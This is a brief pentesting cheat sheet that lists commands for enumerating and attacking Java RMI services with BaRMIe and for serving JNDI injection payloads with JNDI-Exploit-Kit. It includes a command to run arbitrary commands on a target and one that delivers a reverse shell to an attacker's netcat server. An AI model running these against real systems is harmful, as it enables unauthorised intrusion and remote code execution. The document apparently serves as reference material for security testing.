# Java
#plateform/linux #target/remote

## Java RMI scanner enum
#cat/RECON #tag/rmi
Enumeration mode (-enum) extracts details of objects that are exposed through an RMI registry service and lists any known attacks that affect the endpoint.
https://github.com/NickstaDB/BaRMIe/
```
java -jar BaRMIe.jar -enum <target> <port>
```

## Java RMI scanner attack
#tag/ATTACK/EXPLOIT #tag/rmi
Attack mode (-attack) first enumerates the given targets, then provides a menu system for launching known attacks against RMI services.
https://github.com/NickstaDB/BaRMIe/
```
java -jar BaRMIe.jar -attack <target> <port>
```

## JNDI Exploit Kit
#tag/ATTACK/EXPLOIT #tag/jndi
Multipurpose RMI and ldap server for payload delivery via RMI
https://github.com/pimps/JNDI-Exploit-Kit
```
java -jar JNDI-Injection-Exploit-all.jar -C "<command>" 
```

## JNDI Exploit Kit
#tag/ATTACK/EXPLOIT #tag/jndi
Multipurpose RMI and ldap server for payload delivery via RMI. The ldap and rmi server will deliver a payload that either execute a command or gives a reverse shell to a netcat server.
https://github.com/pimps/JNDI-Exploit-Kit
```
java -jar JNDI-Injection-Exploit-all.jar -R "<nc_server>:<port>"
```

